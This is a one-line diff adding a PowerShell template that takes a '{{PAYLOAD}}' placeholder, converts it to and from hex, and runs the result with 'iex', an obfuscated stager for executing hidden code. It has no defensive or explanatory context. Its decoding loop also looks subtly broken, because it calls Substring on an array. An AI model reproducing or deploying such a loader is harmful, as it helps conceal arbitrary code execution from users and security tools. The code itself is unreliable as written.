@@ -1,0 +1,1 @@
+$h='{{PAYLOAD}}'.ToCharArray()|%{"{0:X2}" -f [int]$_};$b='';for($i=0;$i -lt $h.Length;$i+=2){$b+=[char][Convert]::ToByte($h.Substring($i,2),16)};iex $b
